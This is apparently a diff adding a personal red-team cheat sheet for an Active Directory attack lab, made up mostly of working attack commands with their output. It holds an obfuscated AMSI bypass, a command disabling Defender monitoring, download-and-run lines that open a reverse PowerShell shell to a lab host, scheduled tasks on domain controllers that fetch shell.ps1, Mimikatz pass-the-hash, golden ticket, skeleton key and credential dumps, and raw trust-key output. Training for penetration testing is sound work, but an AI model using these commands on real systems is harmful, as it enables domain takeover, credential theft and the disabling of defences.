@@ -1,0 +1,1713 @@
+REDTEAM
+
+Bypass MSI 
+
+1- powershell -ep bypass 
+2- sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+3- Load Powerview : . .\powerview.ps1 
+4- 
+
+
+Remote Session: 
+
+	A: $sess = new-pssession -ComputerName dcorp-adminsrv 
+	
+	B: Enter-PSSession -session $sess  / Enter-PSSEssion -Id 1 
+
+Download Payload: 
+
+	A: powershell.exe iex (iwr http://172.16.100.X/Invok-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.X -Port 4444
+	
+	B: powercat -l -v -p 4444 -t 100 
+	
+	
+
+ADMINACCESS
+A: Find-LocalAdminAccess -Verbose
+
+[*] dcorp-adminsrv.dollarcorp.moneycorp.local
+
+
+B: 
+ 
+ . .\Find-PSRemotingLocalAdminAccess.ps1
+ 
+ Find-PSRemotingLocalAdminAccess
+
+C:	Check Admin Access 
+
+	 Invoke-UserHunter -CheckAccess 
+
+D: Create interactive session
+	
+	$sess = New-PSSession -ComputerName dcorp-mgmt
+
+E:	Disable Microsoft Security Realtime Monitoring 
+
+	Invoke-Command -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true} -Session $sess
+	
+F: 
+	Execute Powershell using Admin shell : Generate the ticket using ntlm 
+		Invoke-Mimikatz  -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
+	
+	DSRM 
+		Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:dcorp-dc /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
+
+	Host Service 
+		Invoke-Mimikatz -Command '"kerberos::golden /SID:S-1-5-21-1874506631-3219952063-538504511 /user:Administrator /service:HOST /rc4:45824f594dbe3ec37155fd72bc676a8c /target:dcorp-dc.dollarcorp.moneycorp.local /domain:dollarcorp.moneycorp.local /ptt"'
+
+	RPCSS Service 
+		Invoke-Mimikatz -Command '"kerberos::golden /SID:S-1-5-21-1874506631-3219952063-538504511 /user:Administrator /service:RPCSS /rc4:45824f594dbe3ec37155fd72bc676a8c /target:dcorp-dc.dollarcorp.moneycorp.local /domain:dollarcorp.moneycorp.local /ptt"'
+
+	Dump hashes:
+		Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+	
+	Dump SAM 
+		Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam" '
+
+	Stored Creds in Creds Store 
+			Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
+
+	Extract Keys:			
+			Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+
+	Skeleton Command:
+			 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
+	
+	Create Golden Ticket impersonateing IDentity:
+
+		Invoke-Mimikatz -Command '"kerberos::golden /user:administrator /domain:dollarcorp.moneycorp.local /krbt
+		gt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /sid:S-1-5-21-1874506631-3219952063-538504511 /ptt"'
+
+I: Download File 
+
+	 iex (iwr http://172.16.100.48:8080/IM.ps1)
+	 iex (iwr http://172.16.100.48:8080/IM.ps1 -UseBasicParsing)
+	
+J: Bypass ASMI 
+	
+	sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+
+	powershell -ep bypass 
+	
+M:  WMI remote server 
+
+	gwmi -Class win32_computersystem -ComputerName dcorp-dc
+	
+O: Enable DSRM remote access 
+	
+	New-ItemProperty "HKLM:\System\CurrentControlSet\Control\lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+		
+	
+	>  schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Shell348" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.48:8080/shell.ps1''')'"
+
+> schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "Shell348"
+
+
+
+ACTIVITIES
+
+
+A-20
+Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA tothe parent domain, moneycorp.local using dollarcorp's krbtgt hash.
+
+SID: Domain SID
+SIDS: ?? 
+
+> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
+
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
+Load ticket 
+
+> Invoke-Mimikatz -Command '"kerberos::pttC:\AD\Tools\krbtgt_tkt.kirbi"'
+
+>  schtasks /create /S mcorp-dc.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Shell348" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.48:8080/shell.ps1''')'"
+
+> schtasks /Run /S mcorp-dc.moneycorp.local /TN "Shell348"
+
+> 
+
+A-21
+
+With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on theDC of eurocorp.local forest.
+
+
+
+lsadump::trust /patch
+
+Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-1874506631-3219952063-538504511)
+
+Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
+    * 10/2/2020 9:05:45 PM - CLEAR   - 56 f0 84 19 58 0b b7 60 3c 36 8a f8 13 7f 29 ea 2e 42 78 38 21 46 67 8e f2 19 f1 26 c0 81 ef 1d a8 f2 6e b5 80 9d 8e 11 0c 38 b6 ad 0e 97 ba 33 19 21 01 51 4a 91 3b 33 57 91 44 30 fa f2 90 b7 af 3d e8 d0 06 81 44 ea 53 cc 82 31 25 d3 a3 03 de cb ba ed 44 1d 86 65 05 cb d3 6a 3c c8 21 4f ad e4 64 0d 8c 69 05 f9 78 42 68 7a d6 de 62 42 f8 b8 3b 44 d3 e7 11 de a9 25 94 b5 92 d9 04 42 25 18 8e 9b bd 38 4a 9d 9a 38 c9 19 fe 88 6b 7b fb 36 f1 c8 0c e0 e1 46 71 42 a9 19 cb 19 42 be c2 d2 86 f8 38 ac c2 47 ef a0 36 23 43 a8 7e 2d dc cb 15 4c 93 1f 2d ec d7 82 2e 7f 4c c7 3a 33 42 f1 77 5a c1 3f 42 ce 9f 21 a5 19 d2 29 23 4f 25 56 99 05 7d 92 03 d1 04 33 31 e5 01 8f 29 ab 18 85 85 4f 38 a5 66 30 84 ba dc dd 71 08 25 99
+        * aes256_hmac       4c35b95c441a4d8ccdefe149acad8b4e24902bfd30c8f07c21f113963aa94394
+        * aes128_hmac       a8f92623bc17512b7be313fc9fc15876
+        * rc4_hmac_nt       455ef4ca2d65642d7a7063d4fa1468ca
+
+ [ Out ] MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 10/2/2020 9:04:08 PM - CLEAR   - 22 f1 c2 a8 e6 94 0a f5 d1 60 98 98 00 c5 7f 67 3a fc ef 7d 52 b6 05 92 70 2e 97 b3 f8 fb 0c ac 16 25 19 d2 5d cf 59 63 08 f6 d0 cc 72 97 79 84 24 09 cc 82 e5 0c 60 f9 68 e5 6c bb 04 15 41 35 05 a7 24 3d cf 32 ac 6d 1a b9 8c f4 cd d3 12 6a d5 3e 7e 34 a6 0d 86 f6 01 58 34 78 b5 df ac c5 64 e9 85 01 be ff d8 a6 d7 d7 ec dc 7e 45 02 59 ec d6 7d 08 ad 88 76 9f ae 73 ee 42 49 86 5d 0d 50 de 51 77 ce 16 af c0 cc c0 8a a6 d6 c4 02 3a 6e 5e 2f 44 aa f0 72 5d bd 61 4d de 1c b0 da f0 93 19 5b 4b 75 fd 9c 96 98 4e a1 65 7f 72 66 4d 4d 16 8b 1b 31 93 f8 cb 6f 43 f7 d9 5f e7 1d a7 f6 3f 01 e7 a0 f0 07 58 f7 f0 0e f2 e2 e8 c0 05 81 42 a8 ec 3a 9e 58 47 96 95 35 bb 23 d9 ba b3 88 ab 17 52 ae d3 1d a7 f4 c4 75 71 84 b8 5e 8a
+        * aes256_hmac       27653f7415c66023e374d78971a633b01ccd2bca54d2e411957a94b965a7fe13
+        * aes128_hmac       6fd2341e2a6b5a6ccbac928c7befcb2d
+        * rc4_hmac_nt       1bc0d579dfacf4f783adec82a41246b3
+
+ [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
+    * 8/19/2020 8:17:26 PM - CLEAR   - 32 1d f8 2e c4 9b 98 33 09 76 ae 88 ff 6a 43 40 68 c9 65 33 2a 59 5e 2f 5d a1 f2 58 15 17 0c 5d b5 16 7b 09 84 cb fc 82 98 14 49 25 88 fc 60 c8 76 1c ff 77 9f 7a 4c 14 18 a9 99 d7 03 34 e8 66 16 1c f8 cc 9b 31 92 b5 e2 8e 0d 91 a3 5c ee f6 93 79 2d 9a 7c 76 db d3 7b 64 78 73 5e 68 91 62 ce 66 9e ba 8e 83 79 dd 92 54 0f 1f 37 2f 67 96 fc a7 d3 f6 a9 4e f0 02 fc d9 3b 88 bc 70 20 6a 8d 8e 55 bf f8 93 9e 41 33 cc 1e ac d3 2b 86 65 02 3e 37 b3 bd 65 1e 04 81 bc e1 ee 95 a8 cd e1 84 39 49 dc 22 11 1f 4b 7d 9c 62 b9 fd 0a 49 6e 8f 31 c8 14 97 49 c6 d1 69 b1 55 97 a9 8d cb 3b f7 1c f2 c4 46 f7 a3 0e 66 5b 2a 42 b1 2a 27 59 ad f6 14 90 20 7d 9e 03 f7 e8 eb fd 2d e6 22 ad 64 87 6c c1 ce a8 f6 b4 15 15 1e 58 15 c5 bd 9b
+        * aes256_hmac       0a5d17550a2edb35ef57d5d1d9ccbe070f8f808ef14c6f1ccea390c61e2a9b40
+        * aes128_hmac       01ec164c6d3531e30b434150044029cd
+        * rc4_hmac_nt       eaa76e5a331a7519b6777e34b7240cab
+
+ [Out-1] MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 10/2/2020 9:04:08 PM - CLEAR   - de dd 15 db c3 23 c1 a8 4f 0d ef 7a b9 76 15 55 e9 6d 9c 7d 8a e8 ed c8 fb f1 07 20 93 c8 0a 36 e8 f1 f5 31 c8 3f 0c 82 65 21 4a a2 1c 3d 36 51 26 cd a2 14 43 90 6c 64 5e c2 82 f7 19 37 0c a4 19 78 9c 35 21 0f 7d c5 55 e6 b3 52 31 47 ab 74 27 f2 20 8f 3c ec c3 f9 74 84 b0 5b e7 a8 68 8a 47 b1 04 a5 d8 48 1d 34 0f b1 e7 23 2b 49 de da d2 7c 65 ea 6a c8 01 f9 14 74 65 16 24 52 46 6f 1b 73 db 63 a4 0d 7e f7 79 a3 61 9c 65 79 c9 34 12 c0 50 da 2f 43 37 7f de c7 95 6c b0 48 05 77 67 b6 f5 0e 40 12 78 df 73 a8 fe 2c cf f1 4a 51 f1 db c4 54 93 10 33 00 22 84 64 5e e4 f2 ef d2 0e 8e 7c 63 d1 eb dc 34 6b ae 24 fb 79 f9 88 34 3a c3 4d 1d 8d 84 43 cd e3 f1 38 3a 02 83 0f 78 30 ce 45 61 4b 2f 5d f9 b3 1a 30 f2 59 fb 92 4a
+        * aes256_hmac       0182c86c3923f937f26b91a5f43d461a6e9960fd30f1781a39b5541d5d47eff6
+        * aes128_hmac       23edd9bcc8c8e91c768918ec55e2d4bf
+        * rc4_hmac_nt       9f656e1657371e90ecdf21ab0aae510f
+
+
+Domain: US.DOLLARCORP.MONEYCORP.LOCAL (us / S-1-5-21-3146393536-1393405867-2905981701)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
+    * 10/2/2020 9:05:52 PM - CLEAR   - ac b3 f5 ca 80 8a bb be 73 37 5d 8d 34 ad 1a fc f9 5b 54 45 9c 0f 4c f0 a2 81 c1 32 95 3c fe 80 58 a6 d1 41 3a 7d 48 ca f1 db d9 f0 6b e3 0a 60 c1 a8 af 8c 94 b3 9d 3b 21 cf db 69 e1 84 e8 28 13 e1 31 4d 8b 01 f0 33 7d 9b 98 a9 fa 96 5d a2 0c 47 1a 84 a4 3b e5 56 da 8e d6 6b c5 b9 10 90 ae 0d eb 4d 9e 6d 83 d6 3e 4d 53 38 31 ea 08 ad 50 ba a7 c9 5b 4e 62 30 94 67 52 e2 b2 9c 17 5a 5f 4f 75 67 90 ab 6b 32 f8 3c ed c5 0b fb 06 4a e7 ab 4b c1 24 0b 6c aa 6a a9 28 fc 3b 04 dc 7a b0 c0 23 45 84 cc 0b f9 2d d3 ae c8 91 6d 34 56 44 70 47 e5 00 3f 0a 50 62 11 de 6e 13 4b 1d a2 2b b6 3e 58 75 0b 5c 99 9d bb 25 4f 7c 2e 04 10 7f 60 49 38 0a d9 fc f4 ed 0c ef b2 7c de 93 da 1e 5f 2b 57 67 28 dc a4 89 33 2f 5b ad af dc 80
+        * aes256_hmac       82707831e9e8474392c980b9099e91769186a1eedb2c68595bb8db126c8de0d4
+        * aes128_hmac       66a039f6fb590e9c02e1ba7f9dc99bda
+        * rc4_hmac_nt       2c7c96280e73323f08d829b242196f37
+
+ [ Out ] US.DOLLARCORP.MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 10/2/2020 9:04:08 PM - CLEAR   - a6 10 52 c5 ce 66 28 46 1b 8a 66 00 49 77 e7 10 0a d0 d7 47 f0 48 04 d8 8b a8 08 82 26 9d 7d cb 80 43 bc 35 bc 6d 1e 90 84 42 fc 2e 2d 44 93 22 47 47 53 1a 5a 52 fb 93 73 32 06 29 c3 56 ba 0b 3a f6 70 b4 42 b7 62 2e 2c ca 45 9a 5a 77 3e fe 55 c9 72 cd 69 1d fe 5d 05 1e d0 33 fb fd 68 cf 79 62 5d b0 66 04 8c 7e 94 55 d7 bc 16 d4 1b e8 de 6c 35 b0 93 10 ee 1a d0 84 37 f1 c2 0e c2 d6 d6 64 55 60 68 33 ac f9 68 ff 70 79 65 ec 20 a8 a9 c7 c1 e8 dc 51 c4 26 07 d7 21 03 65 81 d0 70 1b ba 1d 1f 09 8a 15 79 27 32 b7 41 d6 87 1b 9c e7 d7 f2 6e 60 8d 8e 6c ce 44 fb a7 8d 3e 29 25 fb b3 99 fa b5 eb 49 36 7f 4e 29 2c b6 7a 47 a5 ff 7f 82 40 1c 42 49 a4 05 10 e5 a2 81 b0 7a 21 2d 62 cb 16 26 2e d8 6e d7 b8 f0 d0 39 15 cf 02
+        * aes256_hmac       93ff6d46e2ae7f46ebd73af18e188572046cc095b411677297e2ab8d3cd1c132
+        * aes128_hmac       746d2a83defd8ebf58e04d4000c932c6
+        * rc4_hmac_nt       ac0a03815cb6535c0050885f78716d54
+
+ [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
+    * 8/19/2020 8:02:36 PM - CLEAR   - 35 bb 00 2b 1e 3a 3b b2 cd 48 b4 b7 f9 b1 08 1a 28 ba fa d9 00 5f ae 35 24 8a 2b 82 9c 37 53 d6 6b a1 5d b4 25 37 1c f1 0a 11 c9 94 1a 79 aa 03 2f 73 7b a9 65 1a 8b a2 a4 86 2a 8c 0f b7 b5 62 c4 e8 91 8d 96 ba c4 0c b0 ff e6 e2 99 f9 85 d5 a4 e4 56 ea 53 bd 21 01 b4 f4 b9 c6 71 af fc 9c 90 dc 77 3d 98 42 68 d6 d5 c1 82 a0 6f 52 b6 96 df 39 fa 8e 57 30 39 4b cb d7 af 5c 69 cd 8c b2 10 e4 6d 21 63 b3 6c 18 ae 89 c4 1c 58 60 6d 3d 23 91 f6 f9 f7 43 4f 2f ce b9 9c 1a fd 3b b0 59 ac 09 30 18 08 82 b7 94 77 ee 3c db 25 35 58 5f 3e ef 45 e4 30 c8 da 86 13 a7 dc 6c 29 e7 03 aa f6 ce 9d 89 4a 94 bc a5 62 ff 00 10 6d b6 2d 2f 19 97 ef 65 6a a4 dc 69 e2 d9 6f 6a 86 2b 1c cd 58 6f 86 3e 49 54 de 95 cc 10 b8 a7 2b d9 3d 75
+        * aes256_hmac       301ace0a8be109170e1b8f9fd031bb334ca68b71f62e72b8af72f8f619f18c59
+        * aes128_hmac       6dda205df1a96101f5ced33c26045787
+        * rc4_hmac_nt       046c66bcf9452b26e0b9210c805336cf
+
+ [Out-1] US.DOLLARCORP.MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 10/2/2020 9:04:08 PM - CLEAR   - bf bc f4 7b dd 6a eb 66 09 4e c4 4d c6 5b f6 97 2b 23 9d 0d c5 f7 be 51 93 37 07 28 a6 f1 17 f0 77 ef e0 04 75 f0 a2 31 bf 64 70 7c 73 06 61 64 f0 94 23 d9 26 3b 54 ca e2 3f 05 5e ec 96 d3 9e 9e 6b df ae 6e c7 09 27 c3 af f5 ea 1e f2 fa e8 12 ee bd a6 92 95 f6 56 ab 86 c1 92 66 13 56 17 a3 04 36 a7 e3 ed b6 80 2d 48 07 8e 6b 37 7d e0 35 ea c4 80 4a 67 46 27 f3 98 b1 95 4f f9 d4 04 44 69 c9 d7 17 74 b3 49 1a 54 11 88 5f 5c fd 84 85 ef 10 73 ab 74 e3 29 1b e6 25 40 f2 fe 72 cb db 92 f8 51 22 69 9b d9 c4 5d 5f 33 01 ee b6 e2 3b 38 dc d0 6a a2 b2 25 0a c6 90 15 d2 c2 53 66 94 c9 4b 41 ef 4e 03 0b 46 4f d1 54 76 07 e3 77 f1 42 5a fe c7 63 2b 07 3b 5e 83 66 76 a9 30 20 25 fc 8d 7f be 92 21 74 b3 cb f6 e3 af b0 d3 4d
+        * aes256_hmac       7944995b752861ea89a4cf1418c67242aa54538b264ca24967c32a7866ab2adf
+        * aes128_hmac       e7f410091e1ca7a40cd6aa7690481caf
+        * rc4_hmac_nt       fb2844600a024d57f2358a2a41f53c59
+
+
+Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-1652071801-1423090587-98612180)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
+    * 10/2/2020 9:05:16 PM - CLEAR   - f3 59 c4 d7 f4 9e db 88 3c c8 a0 1a f4 de a9 9f 51 39 b7 ce 85 21 55 8f 54 ef 71 d2 03 04 66 ec 23 24 50 3a 46 32 79 70 06 84 52 18 80 ff 80 a6 50 53 cb 09 07 88 2a a3 2a 9d ef 23 3d 58 21 14 4e 95 bd 52 81 06 12 6b 32 f8 f7 69 9b b8 8c 2b 37 50 41 9a ba ec 5a 13 6d ec ff 74 a4 98 18 2a c0 ea 02 5d d5 e0 aa 68 0a bb b4 cb 3f 8d 86 f0 73 e2 a7 93 9c 9e 65 6a ee 1d b3 5a b5 14 7d e3 f5 ac b9 4f ae 07 0b a8 a4 1b 52 fd 9a c2 b2 cc 1a 0c 91 cc 93 2c fc 3f 4e b5 d5 40 c8 b1 dc 0d f5 be 17 f9 e6 32 5e 1b 32 67 c2 2e 95 71 a4 3b f8 03 b7 d8 d5 f3 ad cc 09 a3 e7 7a 37 0a 59 ef 16 85 26 84 82 36 18 11 af 3b fd 56 dd 02 5a 4c 8a fe 14 04 a7 39 6b dc 56 6d 1f 43 79 32 f6 4e f8 9e 4b 5f 2e c0 79 58 09 b7 25 7f 51 c2 d6 b8
+        * aes256_hmac       f3b6821794ab8191c377f89507653805573eb8c2f4333629601829c3e25ed1f4
+        * aes128_hmac       518daeb1c79f7e5ad0f0811bc7b3ee62
+        * rc4_hmac_nt       19b730e983a105d59b62f365a0776817
+
+ [ Out ] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 10/2/2020 9:04:09 PM - CLEAR   - 8c 2e 2b 31 55 c4 28 bd ad 1f 1c e9 9a d4 ed 35 3f 1f 3e 6f 96 e4 d8 bf 54 70 5b 82 e6 64 fe d7 4f 94 f2 28 8e ca 11 3f f6 0d 6d e8 33 b3 3f 12 f8 b8 80 e4 e6 71 2e 44 c1 57 63 4a 37 67 5e e9 57 90 d5 d3 ee 03 cd 97 37 1a 3b 23 4c 14 9f 1d a7 12 92 33 b1 f6 64 37 67 dc 29 0c 61 38 f3 f2 cb 4b 53 01 6f be 9a ec 08 f6 85 90 86 a8 3b 21 6c 94 a0 31 4e 04 0c 4f da 0e c8 6a 81 b2 6a 08 00 3c 81 2a 44 d4 b9 f1 a5 d0 c8 6c 72 63 a4 12 00 3c 05 c4 31 bd fb 1c f1 3e be 1f de 74 c9 4e d0 b7 e9 e1 a4 f2 10 3c d7 e9 55 75 b5 6d 06 c9 33 02 e8 e1 99 0a af 70 5f e1 d4 9f e2 8b 84 c4 69 d6 8c 29 a1 9d 2a 48 9b 61 52 7d a8 58 e3 69 c5 c8 fb 0b c5 dc cc c5 45 8c 7c 12 75 15 88 62 88 38 7f 53 ce ea bc 50 05 93 78 9c 81 f9 8a 6d
+        * aes256_hmac       9c1303f7d2a9311317509a20d6fbfa201939b5bce29f8dcc9375e6d3d3a4714d
+        * aes128_hmac       8d1e162b40eca2d7be4ab8d6afbc1116
+        * rc4_hmac_nt       b8b4d22beeb3e4d3986ed6a5a854dd60
+
+ [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
+    * 8/19/2020 8:16:55 PM - CLEAR   - 1f d3 20 8a b0 79 04 30 af 09 c4 89 39 be 0d ba 7a 0f 95 bf 09 87 49 ce 59 56 02 0b 3d 62 cb 49 f5 da 6c 9c ea 8f de 32 8b 1c 55 c7 b9 d0 95 68 c1 41 c7 35 a1 f1 40 71 c1 18 ee b2 da 4a fc 49 dc 46 fe ee 50 cc ee bb 95 e6 c4 ab 8e 8c 9a bd 4d ab 6f 41 ed 41 cc 41 98 3b ac da c5 69 73 7f ef e7 d3 db b4 bf 9f 4d bf c9 cb d1 4b 28 f6 81 79 d6 c3 ab 51 15 79 28 cf e3 5b 00 bf 3e d5 e7 55 93 8d 88 17 70 47 e9 bc 45 66 f5 fa 78 91 ee 74 ec 05 1f 3d 37 d4 6a 2c ee 7e 6a fc f8 82 a5 f5 30 e6 be a4 52 e9 94 53 c0 ee e0 d6 e7 2b de 1d 69 7e 85 3b bd db f0 67 31 d4 1b ab a0 25 bf 3f aa 68 c9 2d 5c 4f 4e 45 c1 3b 24 67 7d 35 c9 5d 1a ac 42 e6 68 03 f0 ec 06 26 5d 1d 8c 7a a6 d6 ab 1a 74 69 37 b5 62 9c f7 14 87 ca 09 da 18
+        * aes256_hmac       8a01a8044c54de6adf77c6fb3b70905aa8e9993cce5ec26bbcd76e40978f1bb2
+        * aes128_hmac       59e9122793d31f8478030a0c367ac8d1
+        * rc4_hmac_nt       7f0ad380eacdfcf1214b38c531581cee
+
+ [Out-1] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
+    * 10/2/2020 9:04:09 PM - CLEAR   - 4d 2b 6b 96 39 39 9b e9 73 20 d6 5f cf b4 a0 3c 6f 1d 07 3b ed 38 e3 eb 58 f5 c4 d7 c1 13 86 38 af 2a 02 f7 e4 aa 2f 26 d7 e2 16 90 38 33 aa d7 87 d2 43 dd a2 e0 61 f3 84 e7 47 69 42 e0 0b aa 99 c6 3c 27 34 83 c1 e6 3b d6 7a ff fa c7 cc 6a 51 dd 67 7d 64 bb e5 40 95 75 5e 7f 34 62 6d ae bd c1 73 eb 02 dd 37 6a 9b ac c0 b0 40 42 c0 54 71 9a de ac 17 b2 66 3a aa ba 91 03 92 82 99 fe 36 8d 6d cc b7 02 71 e2 e9 8f bb aa 63 af 99 c1 db 0d f2 37 94 9c 3c c9 2b 9b 59 c8 45 b8 96 f4 30 6f 14 8f 10 ca e0 a4 1e 79 8c 71 7a 5e ef 6e 94 dc 24 ee 4e 41 a0 4e 16 ca c5 4c c9 94 16 74 bb 4f 8a ba 8d 4c 4d 53 27 df fc 62 8b ef 7c 52 0c 68 46 8e db f8 fb 70 8e d0 57 ce 9c 11 01 da 5e 9a dd 6e ac 71 81 9a b5 88 79 fd b0 2f 91 a1
+        * aes256_hmac       998b59b1e451dc67a251fc0a24eada1d5789f7d88cd6178abbea04fa010ba4d0
+        * aes128_hmac       50e9e682ae69d556eaf1747059df40fa
+        * rc4_hmac_nt       044bea49b0a06ed71009a2927a30dc56
+
+
+PS C:\AD\Tools>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+A-1
+Activity-1 
+
+
+Enumm Users: 
+Enum Comnputer: 
+Enum Domain Admins: 
+Enum Enterprise Admin: 
+Enum Shares 
+---------------------------------------------------------------------
+. .\powerview.ps1 
+
+A: 
+$ Get-NetUser | select samaccountname
+$ Get-NetUser | select -ExpandProperty samaccountname
+
+B:
+$ Get-NetComputer > ..\..\Users\student201\Desktop\computers.txt
+
+C:
+Get-NetGroup 
+Get-NetGroupMemeber -GroupName "Domain Admins" | select -ExpandProperty MemberName 
+
+D: 
+Get-NetGroupMember  -GroupName "Enterprise Admins" -domain moneycorp.local| select -ExpandProperty MemberName
+
+
+E: 
+ Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose
+
+
+
+
+A-2
+Enumerate following for the dollarcorp domain:
+● List all the OUs
+● List all the computers in the StudentMachines OU.
+● List the GPOs
+● Enumerate GPO applied on the StudentMachines OU.
+
+
+A: 
+ Restricted Groups: 
+
+:$ Get-NetGPOGroup
+
+ Membership of Group RDPUsers: 
+
+:$  Get-NetGroupMember -GroupName "RDPUsers" | select -ExpandProperty MemberName
+
+B: 
+
+List OUs 
+
+:$  Get-NetOU
+
+List All Computers in StudentMachines 
+
+:$  Get-NetOU  StudentMachines | %{ Get-NetComputer -ADSpath $_ }
+
+:$ Get-NetOU   | %{ echo $_.Split("=")[1].Split(",")[0]    } | %{echo "[+] $_";GET-NETOU $_ | %{Get-NetComputer -ADSPath $_ ; echo ""} }
+
+C:
+
+ GET-NETGPO | select -ExpandProperty displayNAme
+ GET-NETGPO | select -ExpandProperty ADSPath 
+
+
+D: 
+
+ :$ Get-NetOu StudentMachines -FullData | select -ExcludeProperty gplink |%{ Get-NetGPO -ADSPath $_.gplink.Split(";")[0].Split("[")[1] }
+
+
+A-3
+Enumerate following for the dollarcorp domain:
+? ACL for the Users group
+? ACL for the Domain Admins group
+? All modify rights/permissions for the studentx
+
+A: 
+ Get-ObjectAcl  -SamAccountName users -ResolveGUIDs -Verbose
+
+B:  
+ Get-ObjectAcl  -SamAccountName "Domain Admins"  -ResolveGUIDs -Verbose
+
+C:
+Enumerate ACL for all GPO
+  Get-NetGPo | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
+Enumerate ACL for studentx 
+    Get-NetGPo | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}| ?{$_.IdentityReference -match 'student'}
+Enumerate ACL for RDPUsers 
+    Get-NetGPo | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}| ?{$_.IdentityReference -match 'RDPUsers'}
+>> List modify right/permissions
